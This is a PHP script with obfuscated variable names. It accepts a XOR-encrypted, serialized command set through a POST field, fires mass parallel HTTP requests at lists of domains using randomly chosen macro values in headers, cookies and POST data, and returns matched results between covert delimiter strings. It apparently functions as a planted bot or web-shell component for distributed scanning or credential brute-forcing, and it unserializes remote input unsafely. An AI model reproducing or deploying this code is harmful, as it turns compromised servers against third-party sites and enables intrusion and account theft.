<?php

class TaskGenerator
{
    private static $default_headers = array('Accept-Language' => 'en-US,en;q=0.5',
        'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',);
    private static $default_results = array();

    private static function get_all_full_paths($task_urls_option)
    {
        if (empty($task_urls_option["urls"])) {
            return array();
        }

        $task_urls_option = $task_urls_option["urls"];
        if (isset($task_urls_option["paths"]) && !empty($task_urls_option["paths"]) &&
            is_array($task_urls_option["paths"])) {
            $_4 = $task_urls_option["paths"];
        } else {
            $_4 = array();
        }

        if (isset($task_urls_option["files"]) && !empty($task_urls_option["files"]) &&
            is_array($task_urls_option["files"])) {
            $_5 = $task_urls_option["files"];
        } else {
            $_5 = array();
        }

        $_6 = array();
        if ($_4) {
            foreach ($_4 as $_7) {
                if ($_5) {
                    foreach ($_5 as $_8) {
                        $_6[] = $_7 . $_8;
                    }
                } else {
                    $_6[] = $_7;
                }
            }
        } else if ($_5) {
            foreach ($_5 as $_8) {
                $_6[] = $_8;
            }
        }
        return
            $_6;
    }

    public static function decrypt($data)
    {
        $data = base64_decode($data);
        $key = "jlyaACXPSGFSFmHwXSVnyxHZhkBcbGnt";
        $result = "";
        for ($i = 0; $i < strlen($data);) {
            for ($j = 0; $j < strlen($key) && $i < strlen($data); $j++, $i++) {
                $result .= chr(ord($data[$i]) ^ ord($key[$j]));
            }
        }
        return $result;
    }

    public static function unpack($data)
    {
        $data = TaskGenerator::decrypt($data);
        return unserialize($data);
    }

    public static function generate($task_option)
    {
        $tasks = array();

        $method = !empty($task_option["request"]) ? $task_option["request"] : "GET";
        $headers = !empty($task_option["headers"]) ? $task_option["headers"] : TaskGenerator::$default_headers;
        $post_rawdata = !empty($task_option["post_rawdata"]) ? $task_option["post_rawdata"] : NULL;
        $post_params = !empty($task_option["post_params"]) ? $task_option["post_params"] : array();
        $get_params = !empty($task_option["get_params"]) ? $task_option["get_params"] : array();
        $cookie_params = !empty($task_option["cookie_params"]) ? $task_option["cookie_params"] : array();
        $_22 = !empty($task_option["math_results"]["not_substr"]) ? $task_option["math_results"]["substr"] : "";
        $_23 = !empty($task_option["math_results"]["substr"]) ? $task_option["math_results"]["substr"] : "";
        $_24 = !empty($task_option["math_results"]["regexp"]) ? $task_option["math_results"]["regexp"] : "";
        $request_timeout = !empty($task_option["request_timeout"]) ? intval($task_option["request_timeout"]) : 15.0;
        $connection_timeout = !empty($task_option["connection_timeout"]) ? intval($task_option["connection_timeout"]) : 5.0;

        $_27 = !empty($task_option["return_results"]) ? $task_option["return_results"] : TaskGenerator::$default_results;

        $url_paths = TaskGenerator::get_all_full_paths($task_option);

        if (!empty($task_option["urls"])) {
            foreach ($task_option["urls"]["domains"] as $domain => $domain_meta) {
                foreach ($url_paths as $url_path) {
                    $domain_req_url = $domain . $url_path;

                    $task = new Task();

                    $task->method = $method;
                    $task->domain = $domain;
                    $task->url = $domain_req_url;
                    $task->timeout = $request_timeout;
                    $task->timeout_conn = $connection_timeout;
                    $task->headers = $headers;
                    $task->post_rawdata = $post_rawdata;
                    $task->post_params = $post_params;
                    $task->get_params = $get_params;
                    $task->cookie_params = $cookie_params;
                    $task->domain_meta = $domain_meta;
                    if (isset($task_option["meta"])) $task->global_meta = $task_option["meta"];
                    $task->results_match_notsubstr = $_22;
                    $task->results_match_substr = $_23;
                    $task->results_match_regexp = $_24;
                    $task->results_return_value = $_27;
                    $tasks[] = $task;
                }
            }
        }
        return $tasks;
    }
}

class Task
{
    public $method;
    public $domain;
    public $url;

    public $headers;

    public $post_rawdata;
    public $post_params;
    public $get_params;
    public $cookie_params;

    public $domain_meta;
    public $global_meta;
    private $macros_ctx;

    public $results_match_notsubstr;
    public $results_match_substr;
    public $results_match_regexp;
    public $results_return_value;

    public $timeout;
    public $timeout_conn;

    private $curl_handler = NULL;
    private $result = array();

    private function get_macro_value($name)
    {
        $result = "";

        if ($name == "MYDOMAIN")
        {
            return $this->domain;
        }

        if ($name == "MYURL")
        {
            return $this->url;
        }

        if (isset($this->macros_ctx[$name])) {
            return
                $this->macros_ctx[$name];
        }
        if (!empty($this->domain_meta[$name])) {
            $rand_index = array_rand($this->domain_meta[$name]);
            $result = $this->domain_meta[$name][$rand_index];
            $this->macros_ctx[$name] = $result;
            unset($this->domain_meta[$name][$rand_index]);
        } else
            if (!empty($this->global_meta[$name])) {
                $rand_index = array_rand($this->global_meta[$name]);
                $result = $this->global_meta[$name][$rand_index];
                $this->macros_ctx[$name] = $result;
                unset($this->global_meta[$name][$rand_index]);
            }
        return $result;
    }

    private function process_macros($data)
    {
        if (is_array($data)) {
            $_41 = array();
            $_42 = array_keys($data);
            foreach ($_42 as $_10) {
                $_43 = $this->process_macros($_10);
                $_44 = $this->process_macros($data[$_10]);
                $_41[$_43] = $_44;
            }
            return $_41;
        } else
            if (is_string($data)) {
                preg_match_all("/\{\{(.*?)\}\}/", $data, $_45);
                for ($_12 = 0; $_12 < sizeof($_45[0]); $_12++) {
                    $_46 = $_45[0][$_12];
                    $_38 = $_45[1][$_12];
                    $_47 = $this->get_macro_value($_38);
                    $data = str_replace($_46, $_47, $data);
                }
                return
                    $data;
            } else {
                return $data;
            }
    }

    private function gen_headers()
    {
        $res = array();

        $headers = $this->process_macros($this->headers);
        $cookies = $this->process_macros($this->cookie_params);

        foreach ($headers as $key => $value) {
            $res[] = $key . ": " . $value;
        }

        if (!empty($cookies))
        {
            $cookie = "Cookie: ";
            foreach ($cookies as $key => $value) {
                $cookie .= $key . "=" . $value . ";";
            }
            $res[] = $cookie;
        }

        return $res;
    }

    public function get_curl_handler()
    {
        if (!empty($this->curl_handler)) {
            return $this->curl_handler;
        }
        if (!empty($this->get_params)) {
            $url = $this->url . "?" . http_build_query($this->process_macros($this->get_params));
        } else {
            $url = $this->url;
        }
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_ENCODING , '');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout_conn);
        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $this->method);

        if ($this->headers) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $this->gen_headers());
        }

        if (!empty($this->post_params) || !empty($this->post_rawdata)) {
            if (!empty($this->post_rawdata)) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $this->process_macros($this->post_rawdata));
            } else {
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($this->process_macros($this->post_params)));
            }
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        }

        curl_setopt($ch, CURLOPT_BUFFERSIZE, 128.0);
        curl_setopt($ch, CURLOPT_NOPROGRESS, false);
        curl_setopt($ch, CURLOPT_POSTREDIR, 3);

        $this->curl_handler = $ch;

        return $ch;
    }

    public function parse_result($result)
    {
        $is_matched = FALSE;
        if (!empty($this->results_match_substr)) {
            if (strpos($result, $this->results_match_substr) !== FALSE) {
                $is_matched = TRUE;
            }
        }
        if (!empty($this->results_match_regexp)) {
            if (preg_match($this->results_match_regexp, $result)) {
                $is_matched = TRUE;
            }
        }
        if (!empty($this->results_match_notsubstr)) {
            if (strpos($result, $this->results_match_notsubstr) !== FALSE) {
                $is_matched = FALSE;
            }
        }
        if ($is_matched) {
            $this->result["domain"] = $this->domain;
            $this->result["url"] = $this->url;
            if (in_array("macros", $this->results_return_value)) {
                $this->result["macros"] = $this->macros_ctx;
            }
            if (in_array("post_param", $this->results_return_value)) {
                if (!empty($this->post_rawdata)) {
                    $this->result["post_param"] = $this->post_rawdata;
                } else {
                    $this->result["post_param"] = $this->post_params;
                }
            }
            if (in_array("return_data", $this->results_return_value)) {
                $this->result["return_data"] = $result;
            }
        }
        return $this->result;
    }

    public function get_result()
    {
        return $this->result;
    }
}

class TaskExecutor
{
    public static function run($tasks)
    {
        $mh = curl_multi_init();
        foreach ($tasks as $task) {
            curl_multi_add_handle($mh, $task->get_curl_handler());
        }

        do {
            $status = curl_multi_exec($mh, $active);
            if ($active)
            {
                curl_multi_select($mh);
            }
        } while ($active && $status == CURLM_OK);

        foreach ($tasks as $task) {
            $task->parse_result(curl_multi_getcontent($task->get_curl_handler()));
            curl_multi_remove_handle($mh, $task->get_curl_handler());
        }
        curl_multi_close($mh);
        return $tasks;
    }
}

$tasks_options = TaskGenerator::unpack($_POST["request_option"]);
if (!$tasks_options) {
    exit();
}
$tasks = TaskGenerator::generate($tasks_options);
$tasks = TaskExecutor::run($tasks);
$results = array();
foreach ($tasks as  $task) {
    $result = $task->get_result();
    if (!empty($result)) {
        $results[] = $result;
    }
}
echo "%%%NDOS039" . "dNDIOF%%%" . serialize($results) . "%%%mfpODPM" . "EWpo345ODf%%%" . PHP_EOL;

